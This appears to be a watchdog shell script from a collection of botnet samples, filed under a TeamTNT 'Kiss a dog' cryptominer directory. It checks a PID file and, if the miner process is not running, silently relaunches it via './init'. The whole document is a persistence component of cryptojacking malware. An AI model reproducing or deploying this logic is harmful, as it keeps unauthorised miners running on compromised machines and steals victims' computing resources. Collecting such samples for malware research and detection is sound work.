#!/bin/sh
if test -r /workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner/SOS; then
pid=$(cat /workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner/SOS)
if $(kill -CHLD $pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd /workspaces/Docker-Botnets/teamtnt_kiss_a_dog/xm_miner
./init &>/dev/null
